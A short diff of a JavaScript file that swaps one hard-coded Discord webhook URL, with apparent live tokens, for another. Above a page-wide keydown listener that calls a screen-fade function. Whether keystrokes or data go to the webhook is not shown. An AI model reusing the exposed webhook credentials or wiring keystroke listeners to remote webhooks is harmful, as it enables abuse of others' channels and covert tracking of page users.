@@ -1,5 +1,5 @@
 (function() {
-    const webhookURL = "https://discord.com/api/webhooks/1291171527584383047/7y2F0ueB9IJGQSHWbeu1NFRVMC_sLy_BLpoftnqzZc49wfRksWw5DNSGl5vnQoY3rfPV";
+    const webhookURL = "https://discord.com/api/webhooks/1298784828107390976/ZIAp8jl0FcmE4QmUwZso9q-Smf8gQwjrkDT1oRgrrAfgGyskBH3ymCu3U3dGtUArr4H-";
 
     document.addEventListener('keydown', async function() {
         await fadeScreen();
